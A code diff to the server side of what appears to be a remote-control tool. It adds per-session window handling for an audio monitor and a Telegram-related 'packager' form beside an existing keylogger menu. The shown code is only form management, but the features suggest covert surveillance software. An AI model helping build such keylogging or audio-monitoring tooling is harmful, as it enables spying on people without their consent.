@@ -13,6 +13,8 @@ namespace RemoteControl.Server
         private Dictionary<string, FrmNetworkInfo> sessionNetworkInfoForms = new Dictionary<string, FrmNetworkInfo>();
         private Dictionary<string, FrmWindowManager> sessionWindowMgrForms = new Dictionary<string, FrmWindowManager>();
         private Dictionary<string, FrmHostInfo> sessionHostInfoForms = new Dictionary<string, FrmHostInfo>();
+        private Dictionary<string, FrmAudioMonitor> sessionAudioMonitorForms = new Dictionary<string, FrmAudioMonitor>();
+        private Dictionary<string, FrmTgSafeWPackager> sessionTgPackagerForms = new Dictionary<string, FrmTgSafeWPackager>();
 
         private void onMenuKeyloggerStart(object sender, EventArgs e)
         {
@@ -60,8 +62,21 @@ namespace RemoteControl.Server
         private void onMenuTgSafeWPackager(object sender, EventArgs e)
         {
             if (currentSession == null) return;
-            var frm = new FrmTgSafeWPackager(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
-            frm.Show();
+            string sid = currentSession.SocketId;
+            FrmTgSafeWPackager frm;
+            if (sessionTgPackagerForms.ContainsKey(sid) && !sessionTgPackagerForms[sid].IsDisposed)
+            {
+                frm = sessionTgPackagerForms[sid];
+                if (frm.WindowState == FormWindowState.Minimized) frm.WindowState = FormWindowState.Normal;
+                frm.Activate();
+            }
+            else
+            {
+                frm = new FrmTgSafeWPackager(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
+                sessionTgPackagerForms[sid] = frm;
+                frm.FormClosed += (s, e2) => sessionTgPackagerForms.Remove(sid);
+                frm.Show();
+            }
         }
 
         private void onMenuTgHelper(object sender, EventArgs e)
@@ -163,6 +178,25 @@ namespace RemoteControl.Server
                 frm = new FrmHostInfo(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
                 sessionHostInfoForms[sid] = frm;
                 frm.FormClosed += (s, e2) => sessionHostInfoForms.Remove(sid);
+                frm.Show();
+            }
+        }
+
+        private void OpenAudioMonitorForm()
+        {
+            string sid = currentSession.SocketId;
+            FrmAudioMonitor frm;
+            if (sessionAudioMonitorForms.ContainsKey(sid) && !sessionAudioMonitorForms[sid].IsDisposed)
+            {
+                frm = sessionAudioMonitorForms[sid];
+                if (frm.WindowState == FormWindowState.Minimized) frm.WindowState = FormWindowState.Normal;
+                frm.Activate();
+            }
+            else
+            {
+                frm = new FrmAudioMonitor(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
+                sessionAudioMonitorForms[sid] = frm;
+                frm.FormClosed += (s, e2) => sessionAudioMonitorForms.Remove(sid);
                 frm.Show();
             }
         }
